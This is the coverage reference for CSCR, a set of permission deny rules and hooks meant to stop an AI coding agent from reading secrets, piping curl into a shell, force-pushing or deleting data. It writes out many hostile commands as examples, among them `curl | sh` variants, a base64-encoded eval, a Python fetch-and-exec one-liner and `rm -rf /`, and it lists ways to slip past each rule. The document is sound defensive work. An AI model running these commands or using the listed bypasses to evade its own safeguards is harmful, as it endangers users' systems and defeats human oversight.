# Enforcement coverage: what CSCR can and cannot block

This document is the honest-framing reference for what CSCR's two-layer enforcement model can and cannot block. It enumerates, per Layer 1 deny rule and per Layer 2 hook pattern, the bypass classes the rule/hook does NOT catch. It is the authoritative answer to "if I install CSCR end to end, what am I actually protected against?"

The answer, in one sentence: **CSCR makes the named patterns more expensive to land. It does not eliminate any class of attack.** Read the bypass tables below before relying on either layer.

## Two layers, two contracts

| Layer | Mechanism | Speed | Bypassable by | Loaded by |
|---|---|---|---|---|
| Layer 1 | Permission rules in `settings-template.json` | Fast — runtime command-boundary match | Pattern obfuscation, indirect dispatch, variants the rule doesn't name | The user, manually, via `docs/how-to/merge-settings-template.md` |
| Layer 2 | User-authored hooks from `docs/how-to/write-your-own-hook.md` | Slower — JSON IPC + script start | AST/regex obfuscation, encoded payloads, variants the hook doesn't name | The user, manually, by copying scripts into `~/.claude/hooks/cscr/` |

The layers are **complementary, not redundant**. The permission rule catches the literal pattern at the command boundary; the hook catches AST/regex-detectable variants in tool input. Neither layer is exhaustive. Combine both for defense in depth.

CSCR ships **zero** executable enforcement code. Every layer is user-owned: the user copies the JSON, the user copies the Python, the user runs the merge command. CSCR has no install command and no upgrade mechanism.

---

## Layer 1: Permission rules

The template in `settings-template.json` denies 24 patterns across four groups. Each group is summarised here with its bypass classes.

### Group A: Secret-file reads

Patterns:
- `Read(./.env)`, `Read(./.env.*)`
- `Read(**/secrets/**)`
- `Read(**/.aws/credentials)`
- `Read(**/.ssh/id_*)`, `Read(**/.ssh/*_rsa)`

**Catches:** Direct `Read` tool invocations against the named paths.

**Does NOT catch:**
- Secrets stored in any path the rule doesn't enumerate (`~/credentials/`, `~/.config/myapp/keys`, project-local `secret.json`, etc.). The rule is a denylist; everything not denied is allowed.
- Indirect reads through Bash (`Bash(cat .env)`) — covered by Bash deny patterns OR by the user's Bash permission rules; this group only covers the `Read` tool surface.
- Reads via a tool that wraps file access (a custom MCP server). The rule scopes to `Read`/`Edit`/`Write`; other tool names with file-read effects are not pattern-matched.
- Reads of encrypted secret stores (`pass`, `1password-cli`, `vault`) — the rule path doesn't match the agent's local store path.
- Reads via symbolic links pointing INTO `.env` from a non-denied path. The runtime's path normalisation is documented separately; verify against your specific Claude Code version.

### Group B: Secret-file writes/edits

Patterns:
- `Edit(./.env)`, `Edit(./.env.*)`
- `Write(./.env)`, `Write(./.env.*)`

**Catches:** Direct Edit/Write to `.env` files in the project root.

**Does NOT catch:**
- Writes to `.env.production`, `.env.local`, `.env.${ENV}` in subdirectories deeper than one level — the glob `./.env.*` matches only one path component.
- Writes via Bash (`Bash(echo SECRET > .env)`) — different tool surface; pair with a Bash rule.
- Writes of secrets to files that *aren't* named `.env` (e.g., `config.json`, `app.yaml`). For source-content secret detection, use the `block-hardcoded-secrets-regex` hook (Layer 2).

### Group C: Curl/wget pipe-to-shell

Patterns:
- `Bash(curl * | sh)`, `Bash(curl * | bash)`, `Bash(wget * | sh)`, `Bash(wget * | bash)`
- `Bash(sh -c *curl*)`, `Bash(bash -c *curl*)`, `Bash(eval *curl*)`

**Catches:** Literal direct pipe `network-fetch | shell` and three shell-of-curl indirect variants (`sh -c "…curl…"`, `bash -c "…curl…"`, `eval "…curl…"`).

**Does NOT catch (per design.md fresh-round F7):**
- Process substitution: `bash <(curl ...)` — caught by Layer 2 `block-curl-pipe-sh-extended` hook.
- Download-then-exec: `curl ... -o /tmp/x && sh /tmp/x` — caught by Layer 2 `block-curl-pipe-sh-extended` hook.
- Tee-then-exec: `curl ... | tee /tmp/x; sh /tmp/x` — caught by Layer 2 `block-curl-pipe-sh-extended` hook.
- Multi-step variable construction: `URL=https://x.io/i.sh; curl $URL | sh` — NOT caught by either layer. The literal `curl |` survives the rule via variable indirection; the hook's regex is anchored to literal `curl|wget|fetch` tokens. **Mitigation:** add `Bash(*curl*\\$*|*)` to your own deny list if your codebase doesn't legitimately construct URLs from variables.
- Encoded payloads: `eval "$(echo Y3VybCAuLi4= | base64 -d)"` — not caught.
- Network fetch via non-curl tools: `python -c "import urllib.request; exec(urllib.request.urlopen('...').read())"` — different tool, requires a Python-aware hook (no shipped hook covers this; write one if you care).

### Group D: Force-push to protected branches

Patterns:
- `Bash(git push --force main)`, `Bash(git push --force master)`
- `Bash(git push --force-with-lease main)`, `Bash(git push --force-with-lease master)`

**Catches:** Literal force-push commands targeting `main` or `master` by name.

**Does NOT catch:**
- Short `-f` flag: `git push -f origin main` — caught by Layer 2 `block-force-push-protected` hook.
- `sudo` prefix: `sudo git push --force origin main` — caught by Layer 2 `block-force-push-protected` hook.
- Branches other than `main`/`master` (e.g., `release/2.0`, `production`) — extend `PROTECTED_BRANCHES` in the hook or add literal rules per branch.
- Force-push without explicit branch (`git push --force` relying on upstream tracking) — neither layer catches; both would need to read `.git/config` to resolve the tracked branch.
- Force-push via aliased commands (`git pf main` where `pf = push --force` is in `~/.gitconfig`).
- Force-push through `gh api` or another HTTP client.

### Group E: Destructive rm

Patterns:
- `Bash(rm -rf /)`, `Bash(rm -rf ~)`, `Bash(rm -rf $HOME)`

**Catches:** Exact literal forms targeting root, tilde, or `$HOME`.

**Does NOT catch:**
- `rm -rf /*` (glob expansion to all root children) — different literal pattern.
- `rm -rf ~/` (trailing slash) — different literal pattern.
- `find / -delete`, `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda` — different tools entirely.
- Indirect destruction via `rsync --delete` or `git clean -ffdx`.
- Sandbox-confined destruction (container, VM) — the rule is path-anchored; an in-container `rm -rf /` is denied by the literal match, but containers may be running with `--rm` so the harm is bounded anyway.

---

## Layer 2: Hooks

`docs/how-to/write-your-own-hook.md` documents 11 patterns. Each pattern's section already enumerates its bypass classes; this table is the cross-reference index.

| Hook | Event | Tools | Primary coverage | Largest blind spot |
|---|---|---|---|---|
| `block-force-push-protected` | PreToolUse | Bash | `git push --force\|--force-with-lease\|-f` to PROTECTED_BRANCHES, incl. `sudo` | Force-push relying on upstream-tracking config (`git push --force` with no branch arg) |
| `block-curl-pipe-sh-extended` | PreToolUse | Bash | Process substitution, download-then-exec, tee-then-exec, `eval "$(curl …)"`, `source <(curl …)` | Multi-step variable construction `URL=…; curl $URL \| sh` |
| `block-chmod-777` | PreToolUse | Bash | `chmod 777` / `chmod a+rwx` / `chmod ugo+rwx`, incl. `-R` and `sudo` | Two-step grants `chmod 644 && chmod a+x`; ACL grants via `setfacl` |
| `block-unpinned-installs` | PreToolUse | Bash | Unpinned `pip\|npm\|npx -y\|uvx --from git+\|pipx install` | Pinned-but-malicious (typosquat) packages |
| `block-hardcoded-secrets-regex` | PreToolUse | Write, Edit | Format-anchored AWS/GitHub/Slack/Stripe/OpenAI/Anthropic keys, PEM headers, JWT shapes | Secrets without recognised prefix; encoded forms; at-rest secrets already on disk |
| `block-eval-on-user-input` | PreToolUse | Write, Edit | AST: `eval\|exec\|compile` with user-input first arg or JoinedStr with user FormattedValue | **One-hop variable indirection** `x = input(); eval(x)` — the finder doesn't track bindings |
| `block-pickle-loads` | PreToolUse | Write, Edit | `pickle.load/loads`, `cPickle.*`, `pandas.read_pickle`, `joblib.load`, `torch.load` (default), `np.load` (`allow_pickle=True`) | Wrapper libs (`dill`, `cloudpickle`, `shelve`); indirect deserialisation via `multiprocessing` IPC |
| `block-trust-remote-code` | PreToolUse | Write, Edit | `trust_remote_code=True` keyword in any function call | Flag set via env var or programmatic `setattr`; `**kwargs` indirection |
| `block-dangerously-set-inner-html` | PreToolUse | Write, Edit (`.jsx`/`.tsx`) | `dangerouslySetInnerHTML={{__html: <expr>}}` unless `<expr>` is a string literal or contains a known sanitizer name | Sanitizer aliased through a variable; non-React frameworks (Vue `v-html`, Svelte `{@html}`, Angular `[innerHTML]`) |
| `warn-missing-pydantic-fastapi` | **PostToolUse** | Write, Edit | **Advisory only.** FastAPI route handler with body-shaped param (dict/list/bytes or non-Pydantic class) without a Pydantic annotation | Routes added via `app.add_api_route()` programmatically; bodies read via `await request.json()` instead of declared param |
| `block-shell-true-with-interpolation` | PreToolUse | Write, Edit | AST: `subprocess.{run,Popen,call,check_output,check_call}` with `shell=True` AND interpolated first arg (f-string, `.format`, `%`, `+`, or user-input-named variable) | `os.system(f"…")`, `os.popen(f"…")` (different funcs); subprocess wrapped through a helper |

---

## Coverage matrix: attack class → layer

This is the practical index. For each attack class, which layer covers it?

| Attack class | Layer 1 | Layer 2 hook | Uncovered residual |
|---|---|---|---|
| Read `.env` directly via `Read` tool | ✓ | — | Symbolic links; non-`.env` secret files |
| Write secret content into a source file | — | `block-hardcoded-secrets-regex` | Secrets without recognised prefix; encoded forms |
| `curl … \| sh` literal | ✓ (Group C) | — | Variable indirection |
| `bash <(curl …)` | — | `block-curl-pipe-sh-extended` | Variable indirection |
| `curl -o /tmp/x && sh /tmp/x` | — | `block-curl-pipe-sh-extended` | Variable indirection |
| `eval "$(curl …)"` | ✓ (Group C, `eval *curl*`) AND hook | — | Encoded payloads |
| `URL=…; curl $URL \| sh` | — | — | **Neither layer covers** |
| Unpinned `pip install …` | — | `block-unpinned-installs` | Pinned-but-malicious (typosquat) |
| `chmod 777 /path` | — | `block-chmod-777` | Two-step grants |
| Force-push to `main`/`master` literal | ✓ (Group D) | `block-force-push-protected` | Upstream-tracking inference; non-`origin` remote alias |
| `rm -rf /` literal | ✓ (Group E) | — | `find / -delete`, `dd if=/dev/zero`, in-container destruction |
| `eval(input())` in Python source | — | `block-eval-on-user-input` | `x = input(); eval(x)` |
| `pickle.loads(blob)` | — | `block-pickle-loads` | `dill.loads`, `cloudpickle.loads` |
| `from_pretrained(…, trust_remote_code=True)` | — | `block-trust-remote-code` | Env var `TRANSFORMERS_TRUST_REMOTE_CODE=1` |
| React `dangerouslySetInnerHTML={{__html: user}}` | — | `block-dangerously-set-inner-html` | Vue `v-html`; Svelte `{@html}`; Angular `[innerHTML]` |
| FastAPI route accepting unvalidated body | — | `warn-missing-pydantic-fastapi` (advisory only) | Bodies read via `request.json()` |
| `subprocess.run(f"…{user}", shell=True)` | — | `block-shell-true-with-interpolation` | `os.system(f"…")`; subprocess wrapped through a helper |

The "Uncovered residual" column is the honest answer: even with both layers in place, the named gaps remain. Mitigate them with:
- A static analyzer (semgrep, bandit, ruff) in CI for the AST-detectable gaps (variable-binding indirection, alias chasing, wrapper functions).
- A dedicated secret scanner (gitleaks, trufflehog) for the at-rest secret case.
- Container sandboxing for in-container destruction.
- A more specific hook you write yourself for any class you genuinely care about.

---

## What this document does NOT do

It does not:
- **Provide accuracy guarantees for skill content.** Skills teach; they do not enforce. The accuracy of a skill's advice is a separate concern; see the procurement of a third-party held-out reviewer in P6 of the implementation plan.
- **Enumerate Claude Code platform features.** Hook input/output contracts, permission-rule syntax, and matcher behaviour are documented by the platform. This file describes what CSCR's choices do given the platform; the platform's own behaviour is upstream.
- **Predict adversarial bypass capability.** "Does NOT catch" lists are the bypass classes we've thought through. A motivated adversary will find more. Treat the lists as floors, not ceilings.

## When to update this document

- When `settings-template.json` adds or removes a deny rule (update Group A-E).
- When `docs/how-to/write-your-own-hook.md` adds, removes, or significantly changes a pattern (update Layer 2 table and the coverage matrix).
- When the Claude Code permission-rule format changes (e.g., the platform adds new wildcards or normalisation rules that broaden/narrow what a single rule string matches).
- During the P6 third-party held-out review (the reviewer is explicitly tasked with auditing this document per the design spec's success criterion 8).
